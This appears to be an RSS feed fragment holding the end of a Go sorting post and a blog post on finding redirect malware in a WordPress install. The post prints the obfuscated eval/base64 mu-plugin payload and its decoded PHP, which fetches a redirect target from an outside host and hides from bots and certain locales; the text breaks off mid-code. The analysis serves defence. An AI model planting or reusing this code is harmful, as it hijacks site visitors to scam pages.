<p>Ok, now that we've defined what sorting means let's head over to why I am writing this article.  I discovered a paper called <em>Is this the simplest (and most surprising) sorting algorithm ever?</em> on <a href="https://lobste.rs/s/gh1ngc/is_this_simplest_most_surprising_sorting">lobste.rs</a> today.  Sorting algorithms are often used in basic computer science lectures to teach algorithms. The first algorithm students encounter is very often <a href="https://en.wikipedia.org/wiki/Bubble_sort">Bubble sort</a>.</p>
<p>Bubble sort is by no means a complicated algorithm as you can see in the prototypical Go implementation below:</p>
<pre><code class="language-go">xs := []int{4, 2, 6, 10, 3, -1}

for {
    swapped := false
    for i := 1; i &lt; len(xs); i++ {
        if xs[i-1] &gt; xs[i] {
            xs[i-1], xs[i] = xs[i], xs[i-1]
            swapped = true
        }
    }
    if !swapped {
        break
    }
}
fmt.Println(xs) // prints [-1 2 3 4 6 10]
</code></pre>
<p>You can play with the implementation in the <a href="https://play.golang.org/p/wlTPJe7B5Ij">Go playground</a>.  It just iterates over the array until there is no element to swap anymore.  The only complicated thing is to keep around the state if two elements got swapped.</p>
<p>To my surprise the <a href="https://arxiv.org/pdf/2110.01111.pdf">paper</a> mentioned above is describing an even more straightforward way to sort an array:</p>
<pre><code class="language-go">xs := []int{4, 2, 6, 10, 3, -1}
for i := 0; i &lt; len(xs); i++ {
  for j := 0; j &lt; len(xs); j++ {
    if xs[i] &lt; xs[j] {
      xs[i], xs[j] = xs[j], xs[i]
    }
  }
}
fmt.Println(xs) // prints [-1 2 3 4 6 10]
</code></pre>
<p>It does not get much simpler than this <del>and I assume that this might be the first algorithm future computer science students will encounter in their basic lessons.</del>  For me this algorithm is easier to remember than the classic bubble sort but the paper states that it is not a good candidate for an algorithm introduction.</p>
<blockquote>
<p>You certainly do not want to use it as a first example to introduce
students to sorting algorithms. It is not stable, does not work well for
external sorting, cannot sort inputs arriving online, and does not benefit
from partially sorted inputs.</p>
</blockquote>
<p>You can try this one out in the <a href="https://play.golang.org/p/jml6LqHApAN">Go playground</a> as well.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Take this definition with a grain of salt, I wrote this off the top of my head.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Sat, 17 Feb 2024 13:34:37 +0000</pubDate>
    </item>
    <item>
      <title>How I Detected and Removed Malware from a Wordpress Installation</title>
      <link>https://klingt.net/articles/how-i-detected-and-removed-malware-from-a-wordpress-installation.html</link>
      <description>Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.">
  
  <title>How I Detected and Removed Malware from a Wordpress Installation</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github.min.css'
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href='https://klingt.net/assets/highlightjs/styles/github-dark.min.css'
    media="screen and (prefers-color-scheme: dark)" />
  <script src='https://klingt.net/assets/highlightjs/highlight.min.js'></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How I Detected and Removed Malware from a Wordpress Installation</h1>
<p>This week a friend of mine reached out to me, telling me their website got &quot;hacked&quot;, and asking if I could have a look and see if I can fix it.  Of course they didn't got hacked, instead their Wordpress installation caught a malware.  The only indication I got was that those redirects started about three weeks ago.</p>
<h2>Reproduce the Issue</h2>
<p>First step was visiting their website with developer tools open, trying to reproduce the issue.  It didn't took me long to get redirected, I think the second link I clicked resulted in the scammer website being loaded.</p>
<p><img src="scammer-website-family-drugs-net.png" alt="screenshot showing the scammer website family-drugs.net"></p>
<p>Not a surprise that <code>family-drugs.net</code> accepts Bitcoin, fraud is the only use case of cryptocurrencies<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  The network tab wasn't showing any suspicious requests so I copied the request as cURL statement that resulted in the redirect.  Then I ran the cURL request and, voila, the server responded with a 302 redirect.  This let me rule out malicious Javascript as the culprit, since cURL is not evaluating it.  To get a minimal example I started removing header arguments from the cURL statement until I ended up with:</p>
<pre><code class="language-sh">$ curl -I -H 'referer: infected-website.de' https://infected-website.de/page` 
HTTP/1.1 302 Found
Date: Sun, 03 Apr 2022 16:37:56 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307524123; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>Actually, it didn't matter which value the <code>referer</code> header had, it only had to be present.   Also, they set a cookie for whatever reason.</p>
<h2>Run the Wordpress Website Locally</h2>
<p>We're left with only three candidates that can contain the malware, Apache, Wordpress or its database.  Apache being the most unlikely of the three because the website was hosted on a professional hosting service and then a bunch of customers would have been affected as well.  Anyhow, this could easily be disqualified by running the Wordpress installation locally.  Docker compose is the obvious choice for this setup.</p>
<p>Before I could start with the docker-compose setup I needed to get a copy of the website files and a dump of their MySQL database.  A database dump could be downloaded from the admin panel of the webhoster, it was 42373 lines of SQL and 13MiB in size.  Getting a copy of the file tree was also easy since I had SSH access.</p>
<p>At first I tried to clone the website by using FTP, and there's a reason nobody is using this protocol anymore.  Somehow random files ended up missing in my local copy and thus Wordpress was not starting, only showing some generic error message and no log message at all 😩.  It took me more than an hour until I realized that something was missing.</p>
<p>My rescue was <code>rsync --archive infected-website.de: ./infected-website</code>, resulting in a whopping 18210 files consuming 1.3GiB of disk space 🙈.</p>
<p>Here's the <code>docker-compose.yml</code> I came up with:</p>
<pre><code class="language-yaml">version: &quot;3.9&quot;
    
services:
  db:
    # Note that there's no arm64v8 (Apple Silicon) image for mysql:5.7,
    # but for mysql/mysql-server:5.7 there is one¯\_(ツ)_/¯
    image: mysql/mysql-server:5.7
    restart: always
    volumes:
    # Import database dump.
      - ./infected-website.sql:/docker-entrypoint-initdb.d/dump.sql:ro
    environment:
    # Use the credentials that are defined in wp-config.php.
      MYSQL_DATABASE: infected-website
      MYSQL_USER: admin
      MYSQL_PASSWORD: this-is-a-secret
  wordpress:
    depends_on:
      - db
    image: wordpress:5.9.2
    volumes:
      - ./cloned-website/html:/var/www/html:ro
    ports:
      - &quot;80:80&quot;
    restart: always
</code></pre>
<p>In this setup MySQL is not exposed on <code>localhost:3306</code>, instead it can be accessed from the wordpress container through the <code>db</code> hostname.  This means I needed to apply the following patch to <code>wp-config.php</code>:</p>
<pre><code class="language-diff">-define('DB_HOST', 'localhost');
+define('DB_HOST', 'db');
</code></pre>
<p>Running the website locally was only a <code>docker-compose up</code> away.  After opening <code>localhost</code> in my browser I got redirected to <code>infected-website.de</code>.  Looks like I need to replace the domain with <code>localhost</code> in the SQL dump.  A perfect task for good ol' <code>sed</code>:</p>
<pre><code class="language-sh">$ sed -Ei '' 's/(http:|https:)?\/\/(www\.)?infected-website\.de/http:\/\/localhost/g' usr_web629_1.sq
</code></pre>
<p>Please note that I'm using macOS' <code>sed</code> here, but the same command should work on Linux machines if you remove the empty quotes that follow the <code>-Ei</code> flag.</p>
<p>Now I'm ready to run the site locally.</p>
<h3>Investigation</h3>
<p>I did the obvious at first and searched for occurrences of <code>family-drugs.net</code> in the website source files and the database dump.  That wasn't very fruitful so I tried different encodings of the search string, e.g. base64, hex encoded, unicode escaped and so on<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.  Looking for the substring <code>drugs</code> in a variety of encodings did not help either, no hit in the search results.</p>
<p>Next thing I tried was to deactivate all the plugins through Wordpress' dashboard.  After deactivating them I ran the cURL request again, but this time against <code>localhost</code> and got a redirect 😕.</p>
<pre><code class="language-sh">$ curl -I -H 'referer: does-not-matter' localhost/page
HTTP/1.1 302 Found
Date: Sat, 09 Apr 2022 12:28:36 GMT
Server: Apache/2.4.53 (Debian)
X-Powered-By: PHP/7.4.28
Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307020684; path=/
Location: https://family-drugs.net/
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>I continued with browsing through the SQL dump, looking for suspicious content, and I was shocked to see how much serialized PHP there is in a usual Wordpress database.  However, none of this was malicious, just plugin data.  I did the same for the <code>.php</code> files but there were just too many of them and I couldn't find anything malicious in there as well.  In hindsight I should have searched for high-entropy strings with a tool like <a href="https://github.com/trufflesecurity/truffleHog">truffleHog</a>.</p>
<p>I was running out of ideas, and so I decided to remove things until the redirect didn't occur anymore.  In the database I began deleting tables, each time checking for the redirect.  Eventually, I ended up with a mostly empty database where I also deleted most of <code>wp_options</code> but the redirect still happened.  We can rule out the database now, that's for sure.</p>
<p>The next thing I did was to download a new Wordpress archive and replace the existing files with it.  As you can already imagine, it didn't fix the issue, but this also meant that Wordpress itself was not the culprit.</p>
<p>What we're left with are the plugins, which was surprising to me since I deactivated them already and still saw the redirect happening.  Let's take the sledgehammer and crush down all the plugins, or deleting them one-by-one to say it in a more cultivated manner.  It was the last plugin I looked at, of course, that contained the malware.</p>
<h3>The Malware</h3>
<p>Below are the contents of <code>/wp-content/mu-plugins/index.php</code>, making no secret of their malicious nature.</p>
<pre><code class="language-php">&lt;?php 

/**
 * arbitrary bother focus glorious household invade pursue triangle vertical.
 * acid bundle conservation guilty recreation simplify vacuum.
 * alcohol attitude comedy decline defect delay delicate enviroment exclaim explosive geography harmony junior manufacture navigation neglect recreation remote ridge ridid simplify volcano.
 * adequate aware debate estimate excursion herd illusion jewel nylon passion route ruin shrug sophisticated submerge vain vivid.
 * applause isolate nuclear optimistic transmit virus.
 * @package WordPress
 */

eval (gzinflate(base64_decode(
'xRnbbttG9jkB8g+0oAUpVLJsZ3fbxnVcRaYTt75VF7eFYRBjcmxNRXLYmZEsOwiw'
.'uw/7RwssCux+g/NHPWdISiRFSknQiyAfcW7nfht6/+VX+9EoevaUCsGFI2jEhWLh'
.'rbXV2H329GsWMkdSZZkjFfiO3iPNprll5lc9JiOf3K/fIBURahJVb/T5bXHx2dOb'
.'SegqxkPD5XzMqNV49vQtzhvwqQeAdiJ8Y88AJlUkX7Tb1yBA65qrTZcHbUG9TTVT'
.'5m6y3x3BVhdOOEBUWfPzjWSDXgJeeASL7qhpdIe947PzgdOzB8Pe6aDXOe0f2r2m'
.'ocSErj3U7x87F3bv6PDHcxsP3RBfrj/1xu4cLO2uow1S3umMungmh8r1uaTZ2XpI'
.'7xLlxMd352q73xnDbDBWLKDWVtOIv9v6u7P1fCdFwW4MiwaRurfqTvfs7Nsj+9KU'
.'vhNQKcktNa8aDeNtvBM/IExio+ympmESL2AhPCBdGLbNFD9+RpR4VFjmMXcJ2vmF'
.'YRqbc+Ybu4YHCGtOLT3zzqCglyzdUi6r2Syy+hG8fgq/mudU8/Cgn12fSGmAdzKh'
.'3flJvDwlwqj7JLydADe7mTlBb6igAoxWq2XnY/MuzUGo8QgWiBDk3qrdRS0ILRZu'
.'QrDXmkbt8ZfH/z/+7/E/7/9tvP/n+3+9/wcMf3n875zlORsFPGKCpyckv1FLQccK'
.'9mFUZJf4GDCI7AwidLQ0BLkUC+R7kin6l+cdJLEJlBpzd51nAMdxeQiHJq7CNJAo'
.'LWPauhox2XpJPE9zjgSsrB2S9VuqYh6qFkGFVUuolrI1RSUijVVhLZifmz4SbEoU'
.'XUhTODEX5smTvGsnBJh0IKtZy76crGfMoDNHwW0FVRMR5n2ygpJmTOsvFvY3pLiG'
.'HtgrdY4/kiyaO5nEEP7dCG8kiEDMiEsHHD8lGwdKc0FJh/vHcNJuf4i1222IQseb'
.'BFFW4N1lV/hgVj9SYQWODJ3M157O5JWC61aH1yJYyzIFymjVfSYRPcijuM/vICHU'
.'nb7dg5p9ab4ZDM6dTrdrQ0k+7py+HnZe21hKloRFVJGgt05AlDtyiO9bZtu6JK2H'
.'q7fbzS/eWfsvWotRY78BE7s/71mXW60vN68+azT221hvkJfkZ5lGRi1peUgzJ+TE'
.'AHoeGktzuX2VILncuSqWLp1MuaAE2iCriI5IKGLG3kujPm0sHyth4LIeXgET9amx'
.'j+CFsV1CjggJPWWRWNPon/UGzunwBLqjbpHNdxlLx8W+QvR5Hl6TZDO5bMkRyvQR'
.'lz1UyLTU2rHexxR63hloWlr1abPIY7kN47gs+nNR6MVjsj8fPR8ibS6TZgOgNBUu'
.'R3mxTq9PTeWi5XLgJ0ujEzRmmrJQLlpw3v9UGzBbAWjoadxN3Py7Gu1JhZxZ7QNo'
.'Ypck1ogK+1bIF2O0lGCBlU1uiLfRzOU7lHljL0nQf5rPaiPEbiYpEXCJKc3YcnKN'
.'LV28E4BPw1goo7UYxucbBgiVDj7YVytkWF9pknaylGsm8XZbqCw9G+6Rdq/scpKP'
.'tIr6VMtiqV01luVYzbBucasa6PhaUVoWe/Z3Q7s/cIa9I/Nqff5Nu9ZSxWykt7ac'
.'ZoYwcqDYng5KlZPU7LgALHurOR33R0Tou9xrzm99/XTxLQ8VGSs9OCQuvYbbnz1T'
.'VITEf8OU2SzB9CMJPTp7xRUeigcd14WrIrtmPlP3uZUTDpM0N3UA7YurDu7DFdj7'
.'rqA0lCOuckePAighcjG+YB7lheE51FYqVuA+gQaKLA69gjtgBuUhmTK8Ti1mvqfX'
.'AZFqJc5z4MsdUXeMu3Lc9qhkD9nZjndKl7RRgTpePIRb+SiLoksgpD2SmenDJdFn'
.'4TjD9gmFPDcmK5g+pXeZ/TgqoOgSRUA7Gd5DxaZMTOQq9RIxzgp4QYViWQVzccAD'
.'ot8mpNxHgky1oasdQmes/ohHWQnBkCHJechZqPjBq+K4c35UijuOhOsYwXzQ0obD'
.'KU0hIkKFVMjWIm46ngSq84kSzCeE+Zu9oZMwh2/fEjIQK5yH2gEZcVAqNo2N25Fj'
.'4xtKp7RcvWdByOxZ5EOxEyne7593nQviM48ornGAs3Z8lbj3iPNDSr0+pXO/hKmN'
.'Uuz2A+eBNhP+DfgEy4YiCdMn32zvpPyPIAPLhH5slnQATthXRFW4xym7DcimmODW'
.'V4R5ExlBvGq+8JRM8PeP+oPe0Q+xqkBTCfIbFnqJe5bgjgSfsYC5uPMsoiGL3SrF'
.'LwG/x4OEuD1LxVrs6NOHkARVPsgTJrqtgZEcHUYevwO3SDGFnEf3+ASRyiDyZlrf'
.'VLFShHEEXJCE+kH3PMFzTiIqjhnSyx9r5G6J+a5H535sewAJSFHeryQNEMMOaEVp'
.'aWawrG6AVjdBhc5huS/6xK4i/xKrqlLHt/GKemj+jJq+Q6CjWZtAa18bUPsIQ6BL'
.'i044OqB0dHjaGRHovDhC8BOCMQIfwQMCbX/tj1OdABDolBcg2Eawg+A5gr8i+BuC'
.'vyP4HMEXCL5EsGU2zYf7KZ9lXCLXYmjwEa976/z6J9BNSO/id62Z93L6GgDLmfcM'
.'kEeNdEq3Xht7tVrOI9J/Qezm3+buv/xq/1c='
)));
?&gt;
</code></pre>
<p>No wonder I didn't get any results in my search since they <a href="https://en.wikipedia.org/wiki/Deflate">deflated</a> the base64 encoded strings.  Never before have I seen such a malware in the wild so I was very curious to find out what was hiding in it.  There's a very handy tool for such tasks called <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Raw_Inflate(0,0,'Adaptive',false,false)&amp;input=eFJuYmJ0dEc5amtCOGcrMG9BVXBWTEpzWjNmYnhuVmNSYVlUdDc1VkY3ZUZZUkJqY214TlJYTFltWkVzT3dpdwp1dy83Undzc0N1eCtnL05IUFdkSVNpUkZTa25RaXlBZmNXN25maHQ2LytWWCs5RW9ldmFVQ3NHRkkyakVoV0xoCnJiWFYySDMyOUdzV01rZFNaWmtqRmZpTzNpUE5wcmxsNWxjOUppT2YzSy9mSUJVUmFoSlZiL1Q1YlhIeDJkT2IKU2VncXhrUEQ1WHpNcU5WNDl2UXR6aHZ3cVFlQWRpSjhZODhBSmxVa1g3VGIxeUJBNjVxclRaY0hiVUc5VFRWVAo1bTZ5M3gzQlZoZE9PRUJVV2ZQempXU0RYZ0plZUFTTDdxaHBkSWU5NDdQemdkT3pCOFBlNmFEWE9lMGYycjJtCm9jU0VyajNVN3g4N0YzYnY2UERIY3hzUDNSQmZyai8xeHU0Y0xPMnVvdzFTM3VtTXVuZ21oOHIxdWFUWjJYcEkKN3hMbHhNZDM1MnE3M3huRGJEQldMS0RXVnRPSXY5djZ1N1AxZkNkRndXNE1pd2FSdXJmcVR2ZnM3TnNqKzlLVQp2aE5RS2NrdE5hOGFEZU50dkJNL0lFeGlvK3ltcG1FU0wyQWhQQ0JkR0xiTkZEOStScFI0VkZqbU1YY0oydm1GCllScWJjK1lidTRZSENHdE9MVDN6enFDZ2x5emRVaTZyMlN5eStoRzhmZ3EvbXVkVTgvQ2duMTJmU0dtQWR6S2gKM2ZsSnZEd2x3cWo3Skx5ZEFEZTdtVGxCYjZpZ0FveFdxMlhuWS9NdXpVR284UWdXaUJEazNxcmRSUzBJTFJadQpRckRYbWtidDhaZkgvei8rNy9FLzcvOXR2UC9uKzMrOS93Y01mM244NzV6bE9Sc0ZQR0tDcHlja3YxRkxRY2NLCjltRlVaSmY0R0RDSTdBd2lkTFEwQkxrVUMrUjdraW42bCtjZEpMRUpsQnB6ZDUxbkFNZHhlUWlISnE3Q05KQW8KTFdQYXVob3gyWHBKUEU5empnU3NyQjJTOVZ1cVloNnFGa0dGVlV1b2xySTFSU1VpalZWaExaaWZtejRTYkVvVQpYVWhUT0RFWDVzbVR2R3NuQkpoMElLdFp5NzZjckdmTW9ETkh3VzBGVlJNUjVuMnlncEptVE9zdkZ2WTNwTGlHCkh0Z3JkWTQva2l5YU81bkVFUDdkQ0c4a2lFRE1pRXNISEQ4bEd3ZEtjMEZKaC92SGNOSnVmNGkxMjIySVFzZWIKQkZGVzROMWxWL2hnVmo5U1lRV09ESjNNMTU3TzVKV0M2MWFIMXlKWXl6SUZ5bWpWZlNZUlBjaWp1TS92SUNIVQpuYjdkZzVwOWFiNFpETTZkVHJkclEways3cHkrSG5aZTIxaEtsb1JGVkpHZ3QwNUFsRHR5aU85Ylp0dTZKSzJICnE3ZmJ6Uy9lV2ZzdldvdFJZNzhCRTdzLzcxbVhXNjB2TjY4K2F6VDIyMWh2a0pma1o1bEdSaTFwZVVnekorVEUKQUhvZUdrdHp1WDJWSUxuY3VTcVdMcDFNdWFBRTJpQ3JpSTVJS0dMRzNrdWpQbTBzSHl0aDRMSWVYZ0VUOWFteApqK0NGc1YxQ2pnZ0pQV1dSV05Qb24vVUd6dW53QkxxamJwSE5keGxMeDhXK1F2UjVIbDZUWkRPNWJNa1J5dlFSCmx6MVV5TFRVMnJIZXh4UjYzaGxvV2xyMWFiUElZN2tONDdncytuTlI2TVZqc2o4ZlBSOGliUzZUWmdPZ05CVXUKUjNteFRxOVBUZVdpNVhMZ0owdWpFelJtbXJKUUxscHczdjlVR3pCYkFXam9hZHhOM1B5N0d1MUpoWnhaN1FObwpZcGNrMW9nSysxYklGMk8wbEdDQmxVMXVpTGZSek9VN2xIbGpMMG5RZjVyUGFpUEViaVlwRVhDSktjM1ljbktOCkxWMjhFNEJQdzFnb283VVl4dWNiQmdpVkRqN1lWeXRrV0Y5cGtuYXlsR3NtOFhaYnFDdzlHKzZSZHEvc2NwS1AKdElyNlZNdGlxVjAxbHVWWXpiQnVjYXNhNlBoYVVWb1dlL1ozUTdzL2NJYTlJL05xZmY1TnU5WlN4V3lrdDdhYwpab1l3Y3FEWW5nNUtsWlBVN0xnQUxIdXJPUjMzUjBUb3U5eHJ6bTk5L1hUeExROFZHU3M5T0NRdXZZYmJuejFUClZJVEVmOE9VMlN6QjlDTUpQVHA3eFJVZWlnY2QxNFdySXJ0bVBsUDN1WlVURHBNME4zVUE3WXVyRHU3REZkajcKcnFBMGxDT3Vja2VQQWlnaGNqRytZQjdsaGVFNTFGWXFWdUErZ1FhS0xBNjlnanRnQnVVaG1USzhUaTFtdnFmWApBWkZxSmM1ejRNc2RVWGVNdTNMYzlxaGtEOW5aam5kS2w3UlJnVHBlUElSYitTaUxva3NncEQyU21lbkRKZEZuCjRUakQ5Z21GUERjbUs1ZytwWGVaL1RncW9PZ1NSVUE3R2Q1RHhhWk1UT1FxOVJJeHpncDRRWVZpV1FWemNjQUQKb3Q4bXBOeEhna3kxb2FzZFFtZXMvb2hIV1FuQmtDSEplY2hacVBqQnErSzRjMzVVaWp1T2hPc1l3WHpRMG9iRApLVTBoSWtLRlZNaldJbTQ2bmdTcTg0a1N6Q2VFK1p1OW9aTXdoMi9mRWpJUUs1eUgyZ0VaY1ZBcU5vMk4yNUZqCjR4dEtwN1JjdldkQnlPeFo1RU94RXluZTc1OTNuUXZpTTQ4b3JuR0FzM1o4bGJqM2lQTkRTcjArcFhPL2hLbU4KVXV6MkErZUJOaFArRGZnRXk0WWlDZE1uMzJ6dnBQeVBJQVBMaEg1c2xuUUFUdGhYUkZXNHh5bTdEY2ltbU9EVwpWNFI1RXhsQnZHcSs4SlJNOFBlUCtvUGUwUSt4cWtCVENmSWJGbnFKZTViZ2pnU2ZzWUM1dVBNc29pR0wzU3JGCkx3Ry94NE9FdUQxTHhWcnM2Tk9Ia0FSVlBzZ1RKcnF0Z1pFY0hVWWV2d08zU0RHRm5FZjMrQVNSeWlEeVpscmYKVkxGU2hIRUVYSkNFK2tIM1BNRnpUaUlxamhuU3l4OXI1RzZKK2E1SDUzNXNld0FKU0ZIZXJ5UU5FTU1PYUVWcAphV2F3ckc2QVZqZEJoYzVodVMvNnhLNGkveEtycWxMSHQvR0tlbWorakpxK1E2Q2pXWnRBYTE4YlVQc0lRNkJMCmkwNDRPcUIwZEhqYUdSSG92RGhDOEJPQ01RSWZ3UU1DYlgvdGoxT2RBQkRvbEJjZzJFYXdnK0E1Z3I4aStCdUMKdnlQNEhNRVhDTDVFc0dVMnpZZjdLWjlsWENMWFltandFYTk3Ni96Nko5Qk5TTy9pZDYyWjkzTDZHZ0RMbWZjTQprRWVOZEVxM1hodDd0VnJPSTlKL1Flem0zK2J1di94cS8xYz0">CyberChef</a>.</p>
<p>Finally, after a couple of wasted hours, we could get rid of the malware by deleting the <code>index.php</code>.  I also made sure that everything is up-to-date and reset all passwords.  At least I thought at that moment that the website was clean.  A few days later the malware reappeared 😕.</p>
<p>The malware installed itself inside <code>/wp-content/mu-plugins/</code> which is the plugin directory of <a href="https://github.com/WordPress/health-check">Health Check</a>, an official Wordpress plugin<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.  Removing this folder fixed the issue and the malware did not came back, phew.</p>
<p>Also, we got an insight in the malware that seems to be of Russian or Ukrainian origin, because requesting with an <code>UA</code> or <code>RU</code> locale (<code>-H 'Accept-Language: ua</code>) disabled the malware!</p>
<pre><code class="language-php"> ?&gt;&lt;?php
error_reporting(0);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

function cookie()
{

    $may_url = 'https://bing-bot.com/red.txt';
    $ch = curl_init($may_url );
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $html = curl_exec($ch);
    curl_close($ch);
    $new_url =  $html;

    $y2k = mktime(0, 0, 0, 1, 1, 2032);
    if (empty($_COOKIE['sl_message'])) {
        setcookie('sl_message', 'admin', $y2k, '/');
        header('Location: ' . $new_url); die(&quot;_&quot;);
    } else {
        if (empty($_COOKIE['ssl_message'])) {
            setcookie('ssl_message', 'admin', $y2k, '/');
            header('Location: ' . $new_url); die(&quot;_&quot;);
        }

    }
}

class redir
{
	
    var $language;
    var $referer = &quot;&quot;;
    var $url = &quot;&quot;;
    var $url_stop = array(&quot;wp-login.php&quot;, &quot;конец строки&quot;);
    var $lang_stop = array(&quot;ru&quot;, &quot;ua&quot;);
    var $redirekt = true;
    var $ok_str;
    var $stop_referal_str = array(&quot;=site%3A&quot;, &quot;.ru&quot;);

    function __construct()
	
    {
        $this-&gt;add_stop_str();
        $this-&gt;get_refer();
        $this-&gt;get_url();
        $this-&gt;get_lang();
        $this-&gt;test_redirekt();

    }

    private function test_redirekt()
    {
		
        if ($this-&gt;is_bot()) {
            $this-&gt;redirekt = false;
            return;
        }
		
        if ($this-&gt;test_stop_lang()) {
            $this-&gt;redirekt = false;
            return;
        }

        if ($this-&gt;test_stop_str_referal()) {
            $this-&gt;redirekt = false;
            return;
        }

        if ($this-&gt;test_stop_url($this-&gt;url)) {
            $this-&gt;redirekt = false;
            return;
        }

        if (!$this-&gt;strpos_arr($this-&gt;ok_str, $this-&gt;referer)) {
            $this-&gt;redirekt = false;
//            return;
        }
		
//var_dump($this-&gt;url);
		
        if (!$this-&gt;strpos_arr($this-&gt;ok_str, $this-&gt;url)) {
            $this-&gt;redirekt = false;

        }
		  else{
            $this-&gt;redirekt = true;
        }
		
    }

    private function get_lang()
	
    {
        if (($list = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']))) {
            if (preg_match_all('/([a-z]{1,8}(?:-[a-z]{1,8})?)(?:;q=([0-9.]+))?/', $list, $list)) {
                $this-&gt;language = array_combine($list[1], $list[2]);
                foreach ($this-&gt;language as $n =&gt; $v)
                    $this-&gt;language[$n] = $v ? $v : 1;
                arsort($this-&gt;language, SORT_NUMERIC);
            }
        } else $this-&gt;language = array();
    }

    private function test_stop_lang()
    {
        foreach ($this-&gt;lang_stop as $v) {
            if (array_key_exists($v, $this-&gt;language)) {
                return true;
            }
        }
        return false;

    }

    private function test_stop_str_referal()
	
    {

        if ($this-&gt;strpos_arr($this-&gt;stop_referal_str, $this-&gt;referer)) {
            return true;
        }

        return false;

    }

    private function test_stop_url($url)
	
    {
        foreach ($this-&gt;url_stop as $v) {
            if ($this-&gt;test_end($url, $v)) {
                return true;
            }
        }
        return false;

    }
	
    private function strpos_arr($arr, $str)
	
    {
        foreach ($arr as $v) {
            if (strpos(trim(strtolower($str)), strtolower($v)) !== false) {
                return true;
            }
        }
        return false;

    }

    private function test_end($str, $search)
    {
        if (substr($str, strlen($str) - strlen($search)) == $search) {
            return true;
        }
        return false;
    }

    private function get_refer()
    {
        if (isset($_SERVER['HTTP_REFERER'])) {
            $this-&gt;referer = strtolower($_SERVER[&quot;HTTP_REFERER&quot;]);
        }
    }

    private function get_url()
    {
        $this-&gt;url = strtolower($_SERVER['REQUEST_URI']);
    }

    private function is_bot()
    {
        if (!empty($_SERVER['HTTP_USER_AGENT'])) {
            $list = array(
                'vkShare', 'Google', 'VKontakte', 'FacebookExternalHit',
                'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn',
                'YandexScreenshotBot', 'YandexImages', 'YandexVideo', 'YandexVideoParser',
                'YandexMedia', 'YandexBlogs', 'YandexFavicons', 'YandexWebmaster',
                'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
                'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika',
                'YandexNews', 'YandexNewslinks', 'YandexCatalog', 'YandexAntivirus',
                'YandexMarket', 'YandexVertis', 'YandexForDomain', 'YandexSpravBot',
                'YandexSearchShop', 'YandexMedianaBot', 'YandexOntoDB', 'YandexOntoDBAPI',
                'Googlebot', 'Googlebot-Image', 'Mediapartners-Google', 'AdsBot-Google',
                'Mail.RU_Bot', 'bingbot', 'Accoona', 'ia_archiver', 'Ask Jeeves',
                'OmniExplorer_Bot', 'W3C_Validator', 'WebAlta', 'YahooFeedSeeker', 'Yahoo!',
                'Ezooms', '', 'Tourlentabot', 'MJ12bot', 'AhrefsBot', 'SearchBot', 'SiteStatus',
                'Nigma.ru', 'Baiduspider', 'Statsbot', 'SISTRIX', 'AcoonBot', 'findlinks',
                'proximic', 'OpenindexSpider', 'statdom.ru', 'Exabot', 'Spider', 'SeznamBot',
                'oBot', 'C-T bot', 'Updownerbot', 'Snoopy', 'heritrix', 'Yeti',
                'DomainVader', 'DCPbot', 'PaperLiBot'
            );

            foreach ($list as $botname) {
                if (stripos($_SERVER['HTTP_USER_AGENT'], $botname) !== false) {
                    return true;
                }
            }
        }

        return false;
    }

    private function add_stop_str()
    {
        $this-&gt;ok_str = array(
